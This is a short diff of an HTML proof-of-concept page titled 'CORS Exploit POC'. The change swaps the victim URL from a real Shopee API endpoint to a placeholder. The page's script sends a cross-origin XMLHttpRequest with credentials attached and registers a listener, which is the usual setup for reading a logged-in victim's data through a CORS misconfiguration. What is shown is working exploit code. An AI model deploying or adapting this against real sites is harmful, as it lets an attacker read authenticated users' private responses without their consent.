@@ -6,7 +6,7 @@
 		<h1>CORS Exploit POC</h1>
 		<script>
 			var cors = new XMLHttpRequest();
-			var Victim_url = 'https://shopee.co.id/api/v4/banner/batch_list_by_spaces';
+			var Victim_url = 'https://testing.com';
 			cors.open('GET', Victim_url, true);
 			cors.withCredentials = true;
 			cors.onload = reqListener;
